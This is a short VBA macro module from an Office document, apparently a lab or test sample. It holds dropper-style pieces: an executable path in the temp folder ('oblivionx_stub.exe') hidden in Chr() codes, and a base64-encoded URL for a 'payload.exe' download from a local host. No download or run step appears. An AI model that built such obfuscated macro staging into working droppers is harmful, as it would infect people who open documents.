Attribute VB_Name = "NewMacros"
Public Function StubPath() As String
    StubPath = Environ("TEMP") & Chr(92) & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & Chr(105) & Chr(111) & Chr(110) & Chr(120) & Chr(95) & Chr(115) & Chr(116) & Chr(117) & Chr(98) & Chr(46) & Chr(101) & Chr(120) & Chr(101)
End Function

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
